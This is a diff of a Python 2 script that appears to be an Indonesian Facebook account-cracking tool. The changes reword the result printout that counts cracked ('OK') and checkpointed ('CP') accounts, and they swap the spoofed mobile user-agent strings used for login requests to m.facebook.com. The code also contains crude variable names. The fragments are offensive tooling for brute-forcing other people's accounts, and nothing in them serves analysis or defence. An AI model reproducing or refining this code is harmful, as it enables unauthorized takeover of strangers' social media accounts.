@@ -94,9 +94,9 @@ lo_ngentod = '1714009362122228'
 #Crack selesai sayang hehe
 def hasil(ok,cp):
     if len(ok) != 0 or len(cp) != 0:
-        print '\n\n%s[%s✓%s] crack selesai sayang...'%(N,H,N)
-        print '[%s✓%s] total akun OK : %s%s%s'%(O,N,H,str(len(ok)),N)
-        print '[%s✓%s] total akun CP : %s%s%s'%(O,N,H,str(len(cp)),N);exit()
+        print '%s[%s✓%s] crack selesai sayang...'%(N,H,N)
+        print '[%s✓%s] total akun OK : %s%s%s'%(H,N,H,str(len(ok)),N)
+        print '[%s✓%s] total akun CP : %s%s%s\n'%(H,N,K,str(len(cp)),N);exit()
     else:
         print '\n\n[%s!%s] awokawok kaga dapet hasil'%(M,N);exit()
 
@@ -731,7 +731,7 @@ class __crack__:
             try:
             	_kontol = open('YNTKTS.txt', 'r').read()
             except (KeyError, IOError):
-            	_kontol = 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 635) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537;]'
+            	_kontol = 'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11;]'
             ses = requests.Session()
             ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
             p = ses.get("https://m.facebook.com")
@@ -782,7 +782,7 @@ class __crack__:
             try:
             	_kontol = open('YNTKTS.txt', 'r').read()
             except (KeyError, IOError):
-            	_kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
+            	_kontol = 'Mozilla/5.0 (Linux; Android 9; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.105 Mobile Safari/537.36;]'
             ses = requests.Session()
             ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
             p = ses.get("https://m.facebook.com")
